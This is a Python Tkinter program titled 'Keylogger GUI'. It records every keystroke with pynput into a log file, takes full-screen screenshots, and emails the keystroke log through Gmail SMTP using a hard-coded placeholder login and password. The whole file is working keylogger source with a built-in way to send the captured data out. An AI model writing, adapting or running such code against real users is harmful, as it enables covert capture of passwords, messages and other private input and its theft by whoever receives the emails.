from pynput import keyboard
import logging
import os
import tkinter as tk
from tkinter import messagebox
from threading import Thread
import smtplib
from email.mime.text import MIMEText
import subprocess
import PIL
from PIL import ImageGrab
import time

# Define the directory for screenshots and log file
screenshot_dir = r"C:\Users\Maryam\Pictures\Screenshots"
log_dir = os.path.expanduser("~")
log_file = f"{log_dir}/keylog.txt"

# Set up logging configuration
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

listener = None

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

# Function to handle key release (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Function to start the keylogger in a separate thread
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    status_label.config(text="Keylogger Running...", fg="green", bg="light pink")

# Function to stop the keylogger
def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        status_label.config(text="Keylogger Stopped", fg="red", bg="light pink")

# Function to open the log file in Notepad
def open_log():
    if os.path.exists(log_file):
        subprocess.Popen(['notepad', log_file])
    else:
        messagebox.showerror("Error", "Log file does not exist!")

# Function to send the log file via email
def send_email():
    try:
        with open(log_file, 'r') as file:
            msg = MIMEText(file.read())

        msg['Subject'] = 'Keylogger Logs'
        msg['From'] = 'sender@gmail.com'
        msg['To'] = 'receiver@gmail.com'

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login('sender@gmail.com', 'password123')
            server.send_message(msg)
        messagebox.showinfo("Success", "Email sent successfully!")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to send email: {str(e)}")

# Function to capture a screenshot
def capture_screenshot():
    try:
        screenshot_path = f"{screenshot_dir}/screenshot_{int(time.time())}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        messagebox.showinfo("Success", f"Screenshot saved as {screenshot_path}")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to capture screenshot: {str(e)}")

# Setup the GUI
root = tk.Tk()
root.title("Keylogger GUI")
root.geometry("400x300")
root.configure(bg="light pink")

# Create a frame to center all widgets
frame = tk.Frame(root, bg="light pink")
frame.pack(expand=True)

# Status label to display keylogger status
status_label = tk.Label(frame, text="Keylogger Stopped", fg="red", bg="light pink", font=("Arial", 14, "bold"))
status_label.pack(pady=10)

# Button to start the keylogger
start_button = tk.Button(frame, text="Start Keylogger", command=lambda: Thread(target=start_keylogger).start(), bg="#4CAF50", fg="white", width=20, font=("Arial", 12, "bold"))
start_button.pack(pady=5)

# Button to stop the keylogger
stop_button = tk.Button(frame, text="Stop Keylogger", command=stop_keylogger, bg="#f44336", fg="white", width=20, font=("Arial", 12, "bold"))
stop_button.pack(pady=5)

# Button to open the log file
open_log_button = tk.Button(frame, text="Open Log File", command=open_log, bg="#2196F3", fg="white", width=20, font=("Arial", 12, "bold"))
open_log_button.pack(pady=5)

# Button to email the log file
email_log_button = tk.Button(frame, text="Email Log File", command=send_email, bg="#FF9800", fg="white", width=20, font=("Arial", 12, "bold"))
email_log_button.pack(pady=5)

# Button to capture a screenshot
screenshot_button = tk.Button(frame, text="Capture Screenshot", command=capture_screenshot, bg="#9C27B0", fg="white", width=20, font=("Arial", 12, "bold"))
screenshot_button.pack(pady=5)

# Start the GUI loop
root.mainloop()
